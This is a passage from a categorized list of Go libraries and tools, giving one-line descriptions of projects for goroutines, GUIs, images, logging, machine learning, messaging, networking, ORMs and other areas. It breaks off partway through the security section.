parsing, usage like reflect package.\nGoWrap - Generate decorators for Go interfaces using simple templates.\ninterfaces - Command line tool for generating interface definitions.\njennifer - Generate arbitrary Go code without templates.\npkgreflect - Go preprocessor for package scoped reflection.\n\nGeographic\nGeographic tools and servers\n\ngeocache - In-memory cache that is suitable for geolocation based applications.\ngeoserver - geoserver Is a Go Package For Manipulating a GeoServer Instance via the GeoServer REST API.\ngismanager - Publish Your GIS Data(Vector Data) to PostGIS and Geoserver.\nosm - Library for reading, writing and working with OpenStreetMap data and APIs.\npbf - OpenStreetMap PBF golang encoder/decoder.\nS2 geometry - S2 geometry library in Go.\nTile38 - Geolocation DB with spatial index and realtime geofencing.\n\nGo Compilers\nTools for compiling Go to other languages.\n\nc4go - Transpile C code to Go code.\nf4go - Transpile FORTRAN 77 code to Go code.\ngopherjs - Compiler from Go to JavaScript.\nllgo - LLVM-based compiler for Go.\ntardisgo - Golang to Haxe to CPP/CSharp/Java/JavaScript transpiler.\n\nGoroutines\nTools for managing and working with Goroutines.\n\nants - A high-performance goroutine pool for golang.\nartifex - Simple in-memory job queue for Golang using worker-based dispatching.\nasync - A safe way to execute functions asynchronously, recovering them in case of panic.\nbreaker - \ud83d\udea7 Flexible mechanism to make your code breakable.\ncyclicbarrier - CyclicBarrier for golang.\ngo-floc - Orchestrate goroutines with ease.\ngo-flow - Control goroutines execution order.\ngo-tools/multithreading - Manage a pool of goroutines using this lightweight library with a simple API.\ngo-trylock - TryLock support on read-write lock for Golang.\nGoSlaves - Simple and Asynchronous Goroutine pool library.\ngoworker - goworker is a Go-based background worker.\ngpool - manages a resizeable pool of context-aware goroutines to bound concurrency.\ngrpool - Lightweight Goroutine pool.\noversight - Oversight is a complete implementation of the Erlang supervision trees.\nparallel-fn - Run functions in parallel.\npool - Limited consumer goroutine or unlimited goroutine pool for easier goroutine handling and cancellation.\nsemaphore - Semaphore pattern implementation with timeout of lock/unlock operations based on channel and context.\nsemaphore - Fast resizable semaphore implementation based on CAS (faster than channel-based semaphore implementations).\nstl - Software transactional locks based on Software Transactional Memory (STM) concurrency control mechanism.\nthreadpool - Golang threadpool implementation.\ntunny - Goroutine pool for golang.\nworker-pool - goworker is a Go simple async worker pool.\nworkerpool - Goroutine pool that limits the concurrency of task execution, not the number of tasks queued.\n\nGUI\nLibraries for building GUI Applications.\nToolkits\n\napp - Package to create apps with GO, HTML and CSS. Supports: MacOS, Windows in progress.\nfyne - Cross platform native GUIs designed for Go, rendered using EFL. Supports: Linux, macOS, Windows.\ngo-astilectron - Build cross platform GUI apps with GO and HTML/JS/CSS (powered by Electron).\ngo-gtk - Go bindings for GTK.\ngo-sciter - Go bindings for Sciter: the Embeddable HTML/CSS/script engine for modern desktop UI development. Cross platform.\ngotk3 - Go bindings for GTK3.\ngowd - Rapid and simple desktop UI development with GO, HTML, CSS and NW.js. Cross platform.\nqt - Qt binding for Go (support for Windows / macOS / Linux / Android / iOS / Sailfish OS / Raspberry Pi).\nui - Platform-native GUI library for Go. Cross platform.\nWails - Mac, Windows, Linux desktop apps with HTML UI using built-in OS HTML renderer.\nwalk - Windows application library kit for Go.\nwebview - Cross-platform webview window with simple two-way JavaScript bindings (Windows / macOS / Linux).\n\nInteraction\n\ngosx-notifier - OSX Desktop Notifications library for Go.\nrobotgo - Go Native cross-platform GUI system automation. Control the mouse, keyboard and other.\nsystray - Cross platform Go library to place an icon and menu in the notification area.\ntrayhost - Cross-platform Go library to place an icon in the host operating system's taskbar.\n\nHardware\nLibraries, tools, and tutorials for interacting with hardware.\nSee go-hardware for a comprehensive list.\nImages\nLibraries for manipulating images.\n\nbild - Collection of image processing algorithms in pure Go.\nbimg - Small package for fast and efficient image processing using libvips.\ncameron - An avatar generator for Go.\ngeopattern - Create beautiful generative image patterns from a string.\ngg - 2D rendering in pure Go.\ngift - Package of image processing filters.\ngo-cairo - Go binding for the cairo graphics library.\ngo-gd - Go binding for GD library.\ngo-nude - Nudity detection with Go.\ngo-opencv - Go bindings for OpenCV.\ngo-webcolors - Port of webcolors library from Python to Go.\ngocv - Go package for computer vision using OpenCV 3.3+.\ngoimagehash - Go Perceptual image hashing package.\ngovatar - Library and CMD tool for generating funny avatars.\nimage2ascii - Convert image to ASCII.\nimagick - Go binding to ImageMagick's MagickWand C API.\nimaginary - Fast and simple HTTP microservice for image resizing.\nimaging - Simple Go image processing package.\nimg - Selection of image manipulation tools.\nln - 3D line art rendering in Go.\nmergi - Tool & Go library for image manipulation (Merge, Crop, Resize, Watermark, Animate).\nmort - Storage and image processing server written in Go.\nmpo - Decoder and conversion tool for MPO 3D Photos.\npicfit - An image resizing server written in Go.\npt - Path tracing engine written in Go.\nresize - Image resizing for Go with common interpolation methods.\nrez - Image resizing in pure Go and SIMD.\nsmartcrop - Finds good crops for arbitrary images and crop sizes.\nsteganography - Pure Go Library for LSB steganography.\nstegify - Go tool for LSB steganography, capable of hiding any file within an image.\nsvgo - Go Language Library for SVG generation.\ntga - Package tga is a TARGA image format decoder/encoder.\n\nIoT (Internet of Things)\nLibraries for programming devices of the IoT.\n\nconnectordb - Open-Source Platform for Quantified Self & IoT.\ndevices - Suite of libraries for IoT devices, experimental for x/exp/io.\neywa - Project Eywa is essentially a connection manager that keeps track of connected devices.\nflogo - Project Flogo is an Open Source Framework for IoT Edge Apps & Integration.\ngatt - Gatt is a Go package for building Bluetooth Low Energy peripherals.\ngobot - Gobot is a framework for robotics, physical computing, and the Internet of Things.\nhuego - An extensive Philips Hue client library for Go.\niot - IoT is a simple framework for implementing a Google IoT Core device.\nmainflux - Industrial IoT Messaging and Device Management Server.\nperiph - Peripherals I/O to interface with low-level board facilities.\nsensorbee - Lightweight stream processing engine for IoT.\n\nJob Scheduler\nLibraries for scheduling jobs.\n\nclockwerk - Go package to schedule periodic jobs using a simple, fluent syntax.\nclockwork - Simple and intuitive job scheduling library in Go.\ngo-cron - Simple Cron library for go that can execute closures or functions at varying intervals, from once a second to once a year on a specific date and time. Primarily for web applications and long running daemons.\ngron - Define time-based tasks using a simple Go API and Gron\u2019s scheduler will run them accordingly.\nJobRunner - Smart and featureful cron job scheduler with job queuing and live monitoring built in.\njobs - Persistent and flexible background jobs library.\nleprechaun - Job scheduler that supports webhooks, crons and classic scheduling.\nscheduler - Cronjobs scheduling made easy.\n\nJSON\nLibraries for working with JSON.\n\najson - Abstract JSON for golang with JSONPath support.\ngjo - Small utility to create JSON objects.\nGJSON - Get a JSON value with one line of code.\ngo-respond - Go package for handling common HTTP JSON responses.\ngojq - JSON query in Golang.\ngojson - Automatically generate Go (golang) struct definitions from example JSON.\nJayDiff - JSON diff utility written in Go.\nJSON-to-Go - Convert JSON to Go struct.\njsonapi-errors - Go bindings based on the JSON API errors reference.\njsonf - Console tool for highlighted formatting and struct query fetching JSON.\njsongo - Fluent API to make it easier to create Json objects.\njsonhal - Simple Go package to make custom structs marshal into HAL compatible JSON responses.\nkazaam - API for arbitrary transformation of JSON documents.\nmp - Simple cli email parser. It currently takes stdin and outputs JSON.\n\nLogging\nLibraries for generating and working with log files.\n\ndistillog - distilled levelled logging (think of it as stdlib + log levels).\nglg - glg is simple and fast leveled logging library for Go.\nglo - PHP Monolog inspired logging facility with identical severity levels.\nglog - Leveled execution logs for Go.\ngo-cronowriter - Simple writer that rotate log files automatically based on current date and time, like cronolog.\ngo-log - Simple and configurable Logging in Go, with level, formatters and writers.\ngo-log - Log lib supports level and multi handlers.\ngo-log - Log4j implementation in Go.\ngo-logger - Simple logger of Go Programs, with level handlers.\ngologger - Simple easy to use log lib for go, logs in Colored Console, Simple Console, File or Elasticsearch.\ngomol - Multiple-output, structured logging for Go with extensible logging outputs.\ngone/log - Fast, extendable, full-featured, std-lib source compatible log library.\njournald - Go implementation of systemd Journal's native API for logging.\nlog - Structured logging package for Go.\nlog - Simple, configurable and scalable Structured Logging for Go.\nlog - Structured log interface for Go cleanly separates logging facade from its implementation.\nlog-voyage - Full-featured logging saas written in golang.\nlog15 - Simple, powerful logging for Go.\nlogdump - Package for multi-level logging.\nlogex - Golang log lib, supports tracking and level, wrap by standard log lib.\nlogger - Minimalistic logging library for Go.\nlogmatic - Colorized logger for Golang with dynamic log level configuration.\nlogo - Golang logger to different configurable writers.\nlogrus - Structured logger for Go.\nlogrusly - logrus plug-in to send errors to a Loggly.\nlogutils - Utilities for slightly better logging in Go (Golang) extending the standard logger.\nlogxi - 12-factor app logger that is fast and makes you happy.\nlumberjack - Simple rolling logger, implements io.WriteCloser.\nmlog - Simple logging module for go, with 5 levels, an optional rotating logfile feature and stdout/stderr output.\nonelog - Onelog is a dead simple but very efficient JSON logger. It is the fastest JSON logger out there in all scenario. Also, it is one of the logger with the lowest allocation.\nozzo-log - High performance logging supporting log severity, categorization, and filtering. Can send filtered log messages to various targets (e.g. console, network, mail).\nrollingwriter - RollingWriter is an auto-rotate io.Writer implementation with multi policies to provide log file rotation.\nseelog - Logging functionality with flexible dispatching, filtering, and formatting.\nspew - Implements a deep pretty printer for Go data structures to aid in debugging.\nstdlog - Stdlog is an object-oriented library providing leveled logging. It is very useful for cron jobs.\ntail - Go package striving to emulate the features of the BSD tail program.\nxlog - Plugin architecture and flexible log system for Go, with level ctrl, multiple log target and custom log format.\nxlog - Structured logger for net/context aware HTTP handlers with flexible dispatching.\nzap - Fast, structured, leveled logging in Go.\nzerolog - Zero-allocation JSON logger.\n\nMachine Learning\nLibraries for Machine Learning.\n\nbayesian - Naive Bayesian Classification for Golang.\nCloudForest - Fast, flexible, multi-threaded ensembles of decision trees for machine learning in pure Go.\neaopt - An evolutionary optimization library.\nevoli - Genetic Algorithm and Particle Swarm Optimization library.\nfonet - A Deep Neural Network library written in Go.\ngo-cluster - Go implementation of the k-modes and k-prototypes clustering algorithms.\ngo-deep - A feature-rich neural network library in Go.\ngo-fann - Go bindings for Fast Artificial Neural Networks(FANN) library.\ngo-galib - Genetic Algorithms library written in Go / golang.\ngo-pr - Pattern recognition package in Go lang.\ngobrain - Neural Networks written in go.\ngodist - Various probability distributions, and associated methods.\ngoga - Genetic algorithm library for Go.\nGoLearn - General Machine Learning library for Go.\ngolinear - liblinear bindings for Go.\nGoMind - A simplistic Neural Network Library in Go.\ngoml - On-line Machine Learning in Go.\ngoRecommend - Recommendation Algorithms library written in Go.\ngorgonia - graph-based computational library like Theano for Go that provides primitives for building various machine learning and neural network algorithms.\ngorse - A High Performance Recommender System Package based on Collaborative Filtering for Go.\ngoscore - Go Scoring API for PMML.\ngosseract - Go package for OCR (Optical Character Recognition), by using Tesseract C++ library.\nlibsvm - libsvm golang version derived work based on LIBSVM 3.14.\nmlgo - This project aims to provide minimalistic machine learning algorithms in Go.\nneat - Plug-and-play, parallel Go framework for NeuroEvolution of Augmenting Topologies (NEAT).\nneural-go - Multilayer perceptron network implemented in Go, with training via backpropagation.\nocrserver - A simple OCR API server, seriously easy to be deployed by Docker and Heroku.\nprobab - Probability distribution functions. Bayesian inference. Written in pure Go.\nregommend - Recommendation & collaborative filtering engine.\nshield - Bayesian text classifier with flexible tokenizers and storage backends for Go.\ntfgo - Easy to use Tensorflow bindings: simplifies the usage of the official Tensorflow Go bindings. Define computational graphs in Go, load and execute models trained in Python.\nVaris - Golang Neural Network.\n\nMessaging\nLibraries that implement messaging systems.\n\nAPNs2 - HTTP/2 Apple Push Notification provider for Go \u2014 Send push notifications to iOS, tvOS, Safari and OSX apps.\nBeaver - A real time messaging server to build a scalable in-app notifications, multiplayer games, chat apps in web and mobile apps.\nBenthos - A message streaming bridge between a range of protocols.\nBus - Minimalist message bus implementation for internal communication.\nCentrifugo - Real-time messaging (Websockets or SockJS) server in Go.\ndbus - Native Go bindings for D-Bus.\ndrone-line - Sending Line notifications using a binary, docker or Drone CI.\nemitter - Emits events using Go way, with wildcard, predicates, cancellation possibilities and many other good wins.\nevent - Implementation of the pattern observer.\nEventBus - The lightweight event bus with async compatibility.\ngaurun-client - Gaurun Client written in Go.\nGlue - Robust Go and Javascript Socket Library (Alternative to Socket.io).\ngo-notify - Native implementation of the freedesktop notification spec.\ngo-nsq - the official Go package for NSQ.\ngo-socket.io - socket.io library for golang, a realtime application framework.\ngo-vitotrol - Client library to Viessmann Vitotrol web service.\nGollum - A n:m multiplexer that gathers messages from different sources and broadcasts them to a set of destinations.\ngolongpoll - HTTP longpoll server library that makes web pub-sub simple.\ngoose - Server Sent Events in Go.\ngopush-cluster - gopush-cluster is a go push server cluster.\ngorush - Push notification server using APNs2 and google GCM.\nguble - Messaging server using push notifications (Google Firebase Cloud Messaging, Apple Push Notification services, SMS) as well as websockets, a REST API, featuring distributed operation and message-persistence.\nhub - A Message/Event Hub for Go applications, using publish/subscribe pattern with support for alias like rabbitMQ exchanges.\njazz - A simple RabbitMQ abstraction layer for queue administration and publishing and consuming of messages.\nmachinery - Asynchronous task queue/job queue based on distributed message passing.\nmangos - Pure go implementation of the Nanomsg (\"Scalable Protocols\") with transport interoperability.\nmelody - Minimalist framework for dealing with websocket sessions, includes broadcasting and automatic ping/pong handling.\nMercure - Server and library to dispatch server-sent updates using the Mercure protocol (built on top of Server-Sent Events).\nmessagebus - messagebus is a Go simple async message bus, perfect for using as event bus when doing event sourcing, CQRS, DDD.\nNATS Go Client - Lightweight and high performance publish-subscribe and distributed queueing messaging system - this is the Go library.\nnsq-event-bus - A tiny wrapper around NSQ topic and channel.\noplog - Generic oplog/replication system for REST APIs.\npubsub - Simple pubsub package for go.\nrabbus - A tiny wrapper over amqp exchanges and queues.\nrabtap - RabbitMQ swiss army knife cli app.\nRapidMQ - RapidMQ is a lightweight and reliable library for managing of the local messages queue.\nrmqconn - RabbitMQ Reconnection. Wrapper over amqp.Connection and amqp.Dial. Allowing to do a reconnection when the connection is broken before forcing the call to the Close () method to be closed.\nsarama - Go library for Apache Kafka.\nUniqush-Push - Redis backed unified push service for server-side notifications to mobile devices.\nzmq4 - Go interface to ZeroMQ version 4. Also available for version 3 and version 2.\n\nMicrosoft Office\nMicrosoft Excel\nLibraries for working with Microsoft Excel.\n\nexcelize - Golang library for reading and writing Microsoft Excel\u2122 (XLSX) files.\ngo-excel - A simple and light reader to read a relate-db-like excel as a table.\ngoxlsxwriter - Golang bindings for libxlsxwriter for writing XLSX (Microsoft Excel) files.\nxlsx - Library to simplify reading the XML format used by recent version of Microsoft Excel in Go programs.\nxlsx - Fast and safe way to read/update your existing Microsoft Excel files in Go programs.\n\nMiscellaneous\nDependency Injection\nLibraries for working with dependency injection.\n\nalice - Additive dependency injection container for Golang.\ndig - A reflection based dependency injection toolkit for Go.\nfx - A dependency injection based application framework for Go (built on top of dig).\nwire - Strict Runtime Dependency Injection for Golang.\n\nProject Layout\nUnofficial set of patterns for structuring projects.\n\ngo-sample - A sample layout for Go application projects with the real code.\ngolang-standards/project-layout - Set of common historical and emerging project layout patterns in the Go ecosystem.\nscaffold - Scaffold generates starter Go project layout. Lets you focus on business logic implemeted.\n\nStrings\nLibraries for working with strings.\n\nstrutil - String utilities.\nxstrings - Collection of useful string functions ported from other languages.\n\nThese libraries were placed here because none of the other categories seemed to fit.\n\nanagent - Minimalistic, pluggable Golang evloop/timer handler with dependency-injection.\nantch - A fast, powerful and extensible web crawling & scraping framework.\narchiver - Library and command for making and extracting .zip and .tar.gz archives.\nautoflags - Go package to automatically define command line flags from struct fields.\navgRating - Calculate average score and rating based on Wilson Score Equation.\nbanner - Add beautiful banners into your Go applications.\nbase64Captcha - Base64captch supports digit, number, alphabet, arithmetic, audio and digit-alphabet captcha.\nbattery - Cross-platform, normalized battery information library.\nbitio - Highly optimized bit-level Reader and Writer for Go.\nbrowscap_go - GoLang Library for Browser Capabilities Project.\ncaptcha - Package captcha provides an easy to use, unopinionated API for captcha generation.\nconv - Package conv provides fast and intuitive conversions across Go types.\ndatacounter - Go counters for readers/writer/http.ResponseWriter.\nffmt - Beautify data display for Humans.\nghorg - Clone all repos from a GitHub org into a single directory.\ngo-commons-pool - Generic object pool for Golang.\ngo-openapi - Collection of packages to parse and utilize open-api schemas.\ngo-resiliency - Resiliency patterns for golang.\ngo-unarr - Decompression library for RAR, TAR, ZIP and 7z archives.\ngofakeit - Random data generator written in go.\ngommit - Analyze git commit messages to ensure they follow defined patterns.\ngopsutil - Cross-platform library for retrieving process and system utilization(CPU, Memory, Disks, etc).\ngosh - Provide Go Statistics Handler, Struct, Measure Method.\ngosms - Your own local SMS gateway in Go that can be used to send SMS.\ngountries - Package that exposes country and subdivision data.\nhealth - Easy to use, extensible health check library.\nhealthcheck - An opinionated and concurrent health-check HTTP handler for RESTful services.\nhostutils - A golang library for packing and unpacking FQDNs list.\nindigo - Distributed unique ID generator of using Sonyflake and encoded by Base58.\nlk - A simple licensing library for golang.\nllvm - Library for interacting with LLVM IR in pure Go.\nmetrics - Library for metrics instrumentation and Prometheus exposition.\nmorse - Library to convert to and from morse code.\npdfgen - HTTP service to generate PDF from Json requests.\npersian - Some utilities for Persian language in go.\nsandid - Every grain of sand on earth has its own ID.\nshellwords - A Golang library to manipulate strings according to the word parsing rules of the UNIX Bourne shell.\nshortid - Distributed generation of super short, unique, non-sequential, URL friendly IDs.\nstats - Monitors Go MemStats + System stats such as Memory, Swap and CPU and sends via UDP anywhere you want for logging etc...\nturtle - Emojis for Go.\nurl-shortener - A modern, powerful, and robust URL shortener microservice with mysql support.\nVarHandler - Generate boilerplate http input and output handling.\nxdg - FreeDesktop.org (xdg) Specs implemented in Go.\nxkg - X Keyboard Grabber.\n\nNatural Language Processing\nLibraries for working with human languages.\n\ngetlang - Fast natural language detection package.\ngo-eco - Similarity, dissimilarity and distance matrices; diversity, equitability and inequality measures; species richness estimators; coenocline models.\ngo-i18n - Package and an accompanying tool to work with localized text.\ngo-mystem - CGo bindings to Yandex.Mystem - russian morphology analyzer.\ngo-nlp - Utilities for working with discrete probability distributions and other tools useful for doing NLP work.\ngo-pinyin - CN Hanzi to Hanyu Pinyin converter.\ngo-stem - Implementation of the porter stemming algorithm.\ngo-unidecode - ASCII transliterations of Unicode text.\ngo2vec - Reader and utility functions for word2vec embeddings.\ngojieba - This is a Go implementation of jieba which a Chinese word splitting algorithm.\ngolibstemmer - Go bindings for the snowball libstemmer library including porter 2.\ngotokenizer - A tokenizer based on the dictionary and Bigram language models for Golang. (Now only support chinese segmentation)\ngounidecode - Unicode transliterator (also known as unidecode) for Go.\ngse - Go efficient text segmentation; support english, chinese, japanese and other.\nicu - Cgo binding for icu4c C library detection and conversion functions. Guaranteed compatibility with version 50.1.\nkagome - JP morphological analyzer written in pure Go.\nlibtextcat - Cgo binding for libtextcat C library. Guaranteed compatibility with version 2.2.\nMMSEGO - This is a GO implementation of MMSEG which a Chinese word splitting algorithm.\nnlp - Extract values from strings and fill your structs with nlp.\nnlp - Go Natural Language Processing library supporting LSA (Latent Semantic Analysis).\npaicehusk - Golang implementation of the Paice/Husk Stemming Algorithm.\npetrovich - Petrovich is the library which inflects Russian names to given grammatical case.\nporter - This is a fairly straightforward port of Martin Porter's C implementation of the Porter stemming algorithm.\nporter2 - Really fast Porter 2 stemmer.\nprose - Library for text processing that supports tokenization, part-of-speech tagging, named-entity extraction, and more.\nRAKE.go - Go port of the Rapid Automatic Keyword Extraction Algorithm (RAKE).\nsegment - Go library for performing Unicode Text Segmentation as described in Unicode Standard Annex #29\nsentences - Sentence tokenizer:  converts text into a list of sentences.\nshamoji - The shamoji is word filtering package written in Go.\nsnowball - Snowball stemmer port (cgo wrapper) for Go. Provides word stem extraction functionality Snowball native.\nstemmer - Stemmer packages for Go programming language. Includes English and German stemmers.\ntextcat - Go package for n-gram based text categorization, with support for utf-8 and raw text.\nwhatlanggo - Natural language detection package for Go. Supports 84 languages and 24 scripts (writing systems e.g. Latin, Cyrillic, etc).\nwhen - Natural EN and RU language date/time parser with pluggable rules.\n\nNetworking\nLibraries for working with various layers of the network.\n\narp - Package arp implements the ARP protocol, as described in RFC 826.\nbuffstreams - Streaming protocolbuffer data over TCP made easy.\ncanopus - CoAP Client/Server implementation (RFC 7252).\ncidranger - Fast IP to CIDR lookup for Go.\ndhcp6 - Package dhcp6 implements a DHCPv6 server, as described in RFC 3315.\ndns - Go library for working with DNS.\nether - Cross-platform Go package for sending and receiving ethernet frames.\nethernet - Package ethernet implements marshaling and unmarshaling of IEEE 802.3 Ethernet II frames and IEEE 802.1Q VLAN tags.\nfasthttp - Package fasthttp is a fast HTTP implementation for Go, up to 10 times faster than net/http.\nfortio - Load testing library and command line tool, advanced echo server and web UI. Allows to specify a set query-per-second load and record latency histograms and other useful stats and graph them. Tcp, Http, gRPC.\nftp - Package ftp implements a FTP client as described in RFC 959.\ngmqtt - Gmqtt is a flexible, high-performance MQTT broker library that fully implements the MQTT protocol V3.1.1.\ngNxI - A collection of tools for Network Management that use the gNMI and gNOI protocols.\ngo-getter - Go library for downloading files or directories from various sources using a URL.\ngo-stun - Go implementation of the STUN client (RFC 3489 and RFC 5389).\ngobgp - BGP implemented in the Go Programming Language.\ngolibwireshark - Package golibwireshark use libwireshark library to decode pcap file and analyse dissection data.\ngopacket - Go library for packet processing with libpcap bindings.\ngopcap - Go wrapper for libpcap.\ngoshark - Package goshark use tshark to decode IP packet and create data struct to analyse packet.\ngosnmp - Native Go library for performing SNMP actions.\ngotcp - Go package for quickly writing tcp applications.\ngrab - Go package for managing file downloads.\ngraval - Experimental FTP server framework.\nHTTPLab - HTTPLabs let you inspect HTTP requests and forge responses.\njazigo - Jazigo is a tool written in Go for retrieving configuration for multiple network devices.\nkcp-go - KCP - Fast and Reliable ARQ Protocol.\nkcptun - Extremely simple & fast udp tunnel based on KCP protocol.\nlhttp - Powerful websocket framework, build your IM server more easily.\nlinkio - Network link speed simulation for Reader/Writer interfaces.\nllb - It's a very simple but quick backend for proxy servers. Can be useful for fast redirection to predefined domain with zero memory allocation and fast response.\nmdns - Simple mDNS (Multicast DNS) client/server library in Golang.\nmqttPaho - The Paho Go Client provides an MQTT client library for connection to MQTT brokers via TCP, TLS or WebSockets.\nNFF-Go - Framework for rapid development of performant network functions for cloud and bare-metal (former YANFF).\npacket - Send packets over TCP and UDP. It can buffer messages and hot-swap connections if needed.\npeerdiscovery - Pure Go library for cross-platform local peer discovery using UDP multicast.\nportproxy - Simple TCP proxy which adds CORS support to API's which don't support it.\npublicip - Package publicip returns your public facing IPv4 address (internet egress).\nquic-go - An implementation of the QUIC protocol in pure Go.\nraw - Package raw enables reading and writing data at the device driver level for a network interface.\nsftp - Package sftp implements the SSH File Transfer Protocol as described in https://filezilla-project.org/specs/draft-ietf-secsh-filexfer-02.txt.\nssh - Higher-level API for building SSH servers (wraps crypto/ssh).\nsslb - It's a Super Simples Load Balancer, just a little project to achieve some kind of performance.\nstun - Go implementation of RFC 5389 STUN protocol.\ntcp_server - Go library for building tcp servers faster.\ntspool - A TCP Library use worker pool to improve performance and protect your server.\nutp - Go uTP micro transport protocol implementation.\nwater - Simple TUN/TAP library.\nwebrtc - A pure Go implementation of the WebRTC API.\nwinrm - Go WinRM client to remotely execute commands on Windows machines.\nxtcp - TCP Server Framework with simultaneous full duplex communication,graceful shutdown,custom protocol.\n\nHTTP Clients\nLibraries for making HTTP requests.\n\ngentleman - Full-featured plugin-driven HTTP client library.\ngoreq - Enhanced simplified HTTP client based on gorequest.\ngrequests - A Go \"clone\" of the great and famous Requests library.\nheimdall - An enchanced http client with retry and hystrix capabilities.\npester - Go HTTP client calls with retries, backoff, and concurrency.\nrq - A nicer interface for golang stdlib HTTP client.\nsling - Sling is a Go HTTP client library for creating and sending API requests.\n\nOpenGL\nLibraries for using OpenGL in Go.\n\ngl - Go bindings for OpenGL (generated via glow).\nglfw - Go bindings for GLFW 3.\ngoxjs/gl - Go cross-platform OpenGL bindings (OS X, Linux, Windows, browsers, iOS, Android).\ngoxjs/glfw - Go cross-platform glfw library for creating an OpenGL context and receiving events.\nmathgl - Pure Go math package specialized for 3D math, with inspiration from GLM.\n\nORM\nLibraries that implement Object-Relational Mapping or datamapping techniques.\n\nbeego orm - Powerful orm framework for go. Support: pq/mysql/sqlite3.\ngo-pg - PostgreSQL ORM with focus on PostgreSQL specific features and performance.\ngo-queryset - 100% type-safe ORM with code generation and MySQL, PostgreSQL, Sqlite3, SQL Server support based on GORM.\ngo-sqlbuilder - A flexible and powerful SQL string builder library plus a zero-config ORM.\ngo-store - Simple and fast Redis backed key-value store library for Go.\nGORM - The fantastic ORM library for Golang, aims to be developer friendly.\ngorp - Go Relational Persistence, ORM-ish library for Go.\ngrimoire - Grimoire is a database access layer and validation for golang. (Support: MySQL, PostgreSQL and SQLite3).\nlore - Simple and lightweight pseudo-ORM/pseudo-struct-mapping environment for Go.\nMarlow - Generated ORM from project structs for compile time safety assurances.\npop/soda - Database migration, creation, ORM, etc... for MySQL, PostgreSQL, and SQLite.\nQBS - Stands for Query By Struct. A Go ORM.\nreform - Better ORM for Go, based on non-empty interfaces and code generation.\nSQLBoiler - ORM generator. Generate a featureful and blazing-fast ORM tailored to your database schema.\nupper.io/db - Single interface for interacting with different data sources through the use of adapters that wrap mature database drivers.\nXorm - Simple and powerful ORM for Go.\nZoom - Blazing-fast datastore and querying engine built on Redis.\n\nPackage Management\nOfficial tooling for dependency and package management\n\ngo modules - Modules are the unit of source code interchange and versioning. The go command has direct support for working with modules, including recording and resolving dependencies on other modules.\n\nOfficial experimental tooling for package management\n\ndep - Go dependency tool.\nvgo - Versioned Go.\n\nUnofficial libraries for package and dependency management.\n\ngigo - PIP-like dependency tool for golang, with support for private repositories and hashes.\nglide - Manage your golang vendor and vendored packages with ease. Inspired by tools like Maven, Bundler, and Pip.\ngodep - dependency tool for go, godep helps build packages reproducibly by fixing their dependencies.\ngom - Go Manager - bundle for go.\ngoop - Simple dependency manager for Go (golang), inspired by Bundler.\ngop - Build and manage your Go applications out of GOPATH.\ngopm - Go Package Manager.\ngovendor - Go Package Manager. Go vendor tool that works with the standard vendor file.\ngpm - Barebones dependency manager for Go.\njohnny-deps - Minimal dependency version using Git.\nmvn-golang - plugin that provides way for auto-loading of Golang SDK, dependency management and start build environment in Maven project infrastructure.\nnut - Vendor Go dependencies.\nVenGO - create and manage exportable isolated go virtual environments.\n\nQuery Language\n\ngojsonq - A simple Go package to Query over JSON Data.\ngraphql - graphql parser + utilities.\ngraphql - GraphQL server with a focus on ease of use.\ngraphql-go - Implementation of GraphQL for Go.\njsonql - JSON query expression library in Golang.\njsonslice - Jsonpath queries with advanced filters.\nrql - Resource Query Language for REST API.\n\nResource Embedding\n\nesc - Embeds files into Go programs and provides http.FileSystem interfaces to them.\nfileb0x - Simple tool to embed files in go with focus on \"customization\" and ease to use.\ngo-embed - Generates go code to embed resource files into your library or executable.\ngo-resources - Unfancy resources embedding with Go.\ngo.rice - go.rice is a Go package that makes working with resources such as html,js,css,images and templates very easy.\npackr - The simple and easy way to embed static files into Go binaries.\nstatics - Embeds static resources into go files for single binary compilation + works with http.FileSystem + symlinks.\nstatik - Embeds static files into a Go executable.\ntemplify - Embed external template files into Go code to create single file binaries.\nvfsgen - Generates a vfsdata.go file that statically implements the given virtual filesystem.\n\nScience and Data Analysis\nLibraries for scientific computing and data analyzing.\n\nassocentity - Package assocentity returns the average distance from words to a given entity.\nbradleyterry - Provides a Bradley-Terry Model for pairwise comparisons.\nchart - Simple Chart Plotting library for Go. Supports many graphs types.\ndataframe-go - Dataframes for Go for machine-learning and statistics (similar to pandas).\nevaler - Simple floating point arithmetic expression evaluator.\newma - Exponentially-weighted moving averages.\ngeom - 2D geometry for golang.\ngo-dsp - Digital Signal Processing for Go.\ngo-fn - Mathematical functions written in Go language, that are not covered by math pkg.\ngo-gt - Graph theory algorithms written in \"Go\" language.\ngocomplex - Complex number library for the Go programming language.\ngoent - GO Implementation of Entropy Measures.\ngohistogram - Approximate histograms for data streams.\ngonum - Gonum is a set of numeric libraries for the Go programming language. It contains libraries for matrices, statistics, optimization, and more.\ngonum/plot - gonum/plot provides an API for building and drawing plots in Go.\ngoraph - Pure Go graph theory library(data structure, algorith visualization).\ngosl - Go scientific library for linear algebra, FFT, geometry, NURBS, numerical methods, probabilities, optimisation, differential equations, and more.\nGoStats - GoStats is an Open Source GoLang library for math statistics mostly used in Machine Learning domains, it covers most of the Statistical measures functions.\ngraph - Library of basic graph algorithms.\node - Ordinary differential equation (ODE) solver which supports extended states and channel-based iteration stop conditions.\norb - 2D geometry types with clipping, GeoJSON and Mapbox Vector Tile support.\npagerank - Weighted PageRank algorithm implemented in Go.\npiecewiselinear - Tiny linear interpolation library.\nPiHex - Implementation of the \"Bailey-Borwein-Plouffe\" algorithm for the hexadecimal number Pi.\nrootfinding - root-finding algorithms library for finding roots of quadratic functions.\nsparse - Go Sparse matrix formats for linear algebra supporting scientific and machine learning applications, compatible with gonum matrix libraries.\nstats - Statistics package with common functions missing from the Golang standard library.\nstreamtools - general purpose, graphical tool for dealing with streams of data.\nTextRank - TextRank implementation in Golang with extendable features (summarization, weighting, phrase extraction) and multithreading (goroutine) support.\ntriangolatte - 2D triangulation library. Allows translating lines and polygons (both based on points) to the language of GPUs.\n\nSecurity\nLibraries that are used to help make your application more secure.\n\nacmetool - ACME (Let's Encrypt) client tool with automatic renewal.\nacra - Network encryption proxy to protect database-based applications from data leaks: strong selective encryption, SQL injections prevention, intrusion detection system.\nargon2pw - Argon2 password hash generation with constant-time password comparison.\nautocert - Auto provision Let's Encrypt certificates and start a TLS server.\nBadActor - In-memory, application-driven jailer built in the spirit of fail2ban.\nCameradar - Tool and library to remotely hack RTSP streams from surveillance cameras.\ngo-yara - Go Bindings for YARA, the \"pattern matching swiss knife for malware researchers (and everyone else)\".\ngoArgonPass - Argon2 password hash and verification designed to be compatible with existing Python and PHP implementations.\ngoSecretBoxPassword - A probably paranoid package for securely hashing and 